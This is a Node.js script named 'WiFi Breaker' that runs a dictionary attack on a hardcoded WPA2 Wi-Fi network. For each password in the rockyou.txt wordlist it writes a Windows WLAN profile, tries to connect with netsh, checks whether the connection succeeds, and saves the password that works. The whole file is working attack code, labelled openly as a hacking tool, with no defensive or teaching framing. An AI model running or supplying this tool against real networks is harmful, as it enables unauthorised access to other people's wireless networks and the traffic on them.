const fs = require("fs");
const readline = require("readline");
const { execSync } = require("child_process");
const chalk = require("chalk");
const figlet = require("figlet");
const gradient = require("gradient-string");

const ssid = "HITMAN❤️❤️❤️45";
const wordlistPath = "C:\\Users\\Administrator\\Downloads\\rockyou.txt";

const rl = readline.createInterface({
  input: fs.createReadStream(wordlistPath),
  crlfDelay: Infinity,
});

// Hacker header
console.clear();
console.log(
  gradient.cristal(
    figlet.textSync("WiFi Breaker", {
      font: "Slant",
    })
  )
);
console.log(chalk.green("Target SSID:"), chalk.yellow(ssid));
console.log(chalk.green("Wordlist:"), chalk.yellow(wordlistPath));
console.log(chalk.green("Status:"), chalk.cyan("Launching attack...\n"));

async function tryPassword(password) {
  const profile = `
  <?xml version="1.0"?>
  <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>${ssid}</name>
    <SSIDConfig><SSID><name>${ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
      <security>
        <authEncryption>
          <authentication>WPA2PSK</authentication>
          <encryption>AES</encryption>
          <useOneX>false</useOneX>
        </authEncryption>
        <sharedKey>
          <keyType>passPhrase</keyType>
          <protected>false</protected>
          <keyMaterial>${password}</keyMaterial>
        </sharedKey>
      </security>
    </MSM>
  </WLANProfile>`;

  fs.writeFileSync("temp-profile.xml", profile);

  try {
    execSync(`netsh wlan add profile filename="temp-profile.xml" >nul`);
    execSync(`netsh wlan connect name="${ssid}" >nul`);
    process.stdout.write(chalk.cyan(`Trying password: `) + chalk.yellow(password) + "\r");

    await new Promise((r) => setTimeout(r, 6000));
    const output = execSync("netsh wlan show interfaces").toString();

    if (output.includes(`SSID                   : ${ssid}`) && output.includes("State                 : connected")) {
      console.log(chalk.greenBright(`\n\n[✔] Password found: `) + chalk.bold.yellow(password));
      fs.writeFileSync("found.txt", password);
      process.exit(0);
    } else {
      console.log(chalk.red(`[✘] Failed:`), password);
    }
  } catch {
    console.log(chalk.red(`[✘] Failed:`), password);
  }
}

(async () => {
  for await (const password of rl) {
    await tryPassword(password.trim());
  }
})();
